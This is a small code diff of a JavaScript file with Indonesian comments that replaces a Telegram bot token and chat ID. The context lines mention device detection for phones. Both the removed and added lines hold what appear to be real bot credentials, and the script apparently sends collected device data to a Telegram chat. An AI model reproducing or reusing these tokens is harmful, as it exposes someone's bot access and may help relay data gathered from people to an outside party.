@@ -3,8 +3,8 @@
 // =========================================================
 
 // === KONFIGURASI TELEGRAM ===
-const BOT_TOKEN = '8208055515:AAFOVnHmQ_hA1xG7zsdlwVOCXtrAxHUNfRs';  // Ganti Token Bot Anda
-const CHAT_ID = '8405193617';      // Ganti Chat ID Anda
+const BOT_TOKEN = '8617962519:AAFUsD30V25HWI_axyVLCVDxmc7sg5SyLqM';  // Ganti Token Bot Anda
+const CHAT_ID = '8614741263';      // Ganti Chat ID Anda
 
 // === DETEKSI PERANGKAT HP ===
 function getDeviceInfo() {
